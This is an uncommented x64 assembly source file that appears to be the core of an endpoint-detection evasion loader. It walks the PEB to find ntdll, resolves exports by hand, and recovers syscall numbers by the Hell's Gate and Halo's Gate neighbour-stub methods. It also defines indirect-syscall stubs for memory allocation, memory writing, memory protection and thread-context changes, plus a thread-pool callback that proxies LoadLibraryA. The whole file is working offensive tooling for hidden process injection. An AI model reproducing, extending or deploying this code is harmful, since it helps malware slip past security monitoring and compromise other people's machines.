.code
PUBLIC WorkCallback
EXTERN getLoadLibraryA:PROC

EXTERN SSNtAllocateVirtualMemory:DWORD
EXTERN AddrNtAllocateVirtualMemory:QWORD

EXTERN SSNtWriteVirtualMemory:DWORD
EXTERN AddrNtWriteVirtualMemory:QWORD

EXTERN SSNtProtectVirtualMemory:DWORD
EXTERN AddrNtProtectVirtualMemory:QWORD

EXTERN SSNtGetContextThread:DWORD
EXTERN AddrNtGetContextThread:QWORD

EXTERN SSNtSetContextThread:DWORD
EXTERN AddrNtSetContextThread:QWORD

WorkCallback PROC
    mov rcx, rdx
    xor rdx, rdx
    call getLoadLibraryA
    jmp rax
WorkCallback ENDP

NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, SSNtAllocateVirtualMemory
    jmp QWORD PTR [AddrNtAllocateVirtualMemory]
NtAllocateVirtualMemory ENDP

NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, SSNtWriteVirtualMemory
    jmp QWORD PTR [AddrNtWriteVirtualMemory]
NtWriteVirtualMemory ENDP

NtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, SSNtProtectVirtualMemory
    jmp QWORD PTR [AddrNtProtectVirtualMemory]
NtProtectVirtualMemory ENDP

NtGetContextThread PROC
    mov r10, rcx
    mov eax, SSNtGetContextThread
    jmp QWORD PTR [AddrNtGetContextThread]
NtGetContextThread ENDP

NtSetContextThread PROC
    mov r10, rcx
    mov eax, SSNtSetContextThread
    jmp QWORD PTR [AddrNtSetContextThread]
NtSetContextThread ENDP

getntdll PROC
    xor rdi, rdi            
    mul rdi                 
    mov rbx, gs:[rax+60h]   
    mov rbx, [rbx+18h]      
    mov rbx, [rbx+20h]      
    mov rbx, [rbx]          
    mov rbx, [rbx+20h]      
    mov rax, rbx            
    ret                     
getntdll ENDP

getExportTable PROC
    mov rbx, rcx            
    mov r8, rcx             
    mov ebx, [rbx+3Ch]      
    add rbx, r8             
    xor rcx, rcx            
    add cx, 88ffh
    shr rcx, 8h             
    mov edx, [rbx+rcx]      
    add rdx, r8             
    mov rax, rdx            
    ret                     
getExportTable ENDP

getExAddressTable PROC
    mov r8, rdx             
    mov rdx, rcx            
    xor r10, r10
    mov r10d, [rdx+1Ch]     
    add r10, r8             
    mov rax, r10            
    ret                     
getExAddressTable ENDP

getExNamePointerTable PROC
    mov r8, rdx             
    mov rdx, rcx            
    xor r11, r11
    mov r11d, [rdx+20h]     
    add r11, r8             
    mov rax, r11            
    ret                     
getExNamePointerTable ENDP

getExOrdinalTable PROC
    mov r8, rdx             
    mov rdx, rcx            
    xor r12, r12
    mov r12d, [rdx+24h]     
    add r12, r8             
    mov rax, r12            
    ret                     
getExOrdinalTable ENDP

getApiAddr PROC
    mov r10, r9             
    mov r11, [rsp+28h]      
    mov r12, [rsp+30h]      
    xor rax, rax            
    push rcx                
    jmp short getApiAddrLoop
getApiAddr ENDP

getApiAddrLoop PROC
    mov rcx, [rsp]          
    xor rdi, rdi            
    mov edi, [r11+rax*4]    
    add rdi, r8             
    mov rsi, rdx            
    repe cmpsb              
    je getApiAddrFin        
    inc rax
    jmp short getApiAddrLoop
getApiAddrLoop ENDP

getApiAddrFin PROC
    pop rcx                 
    mov ax, [r12+rax*2]     
    mov eax, [r10+rax*4]    
    add rax, r8             
    ret                     
getApiAddrFin ENDP

findSyscallNumber PROC
    xor rsi, rsi
    xor rdi, rdi 
    mov rsi, 00B8D18B4Ch   
    mov edi, [rcx]         
    cmp rsi, rdi
    jne error              
    xor rax,rax            
    mov ax, [rcx+4]        
    ret                    
findSyscallNumber ENDP

halosGateUp PROC
    xor rsi, rsi
    xor rdi, rdi 
    mov rsi, 00B8D18B4Ch   
    xor rax, rax
    mov al, 20h            
    mul dx                 
    add rcx, rax           
    mov edi, [rcx]         
    cmp rsi, rdi
    jne error              
    xor rax,rax            
    mov ax, [rcx+4]        
    ret                    
halosGateUp ENDP

halosGateDown PROC
    xor rsi, rsi
    xor rdi, rdi 
    mov rsi, 00B8D18B4Ch   
    xor rax, rax
    mov al, 20h            
    mul dx                 
    sub rcx, rax           
    mov edi, [rcx]         
    cmp rsi, rdi
    jne error              
    xor rax,rax            
    mov ax, [rcx+4]        
    ret                    
halosGateDown ENDP

error PROC
    xor rax, rax 
    ret          
error ENDP

HellsGate PROC
    xor r11, r11
    mov r11d, ecx
    ret
HellsGate ENDP

END
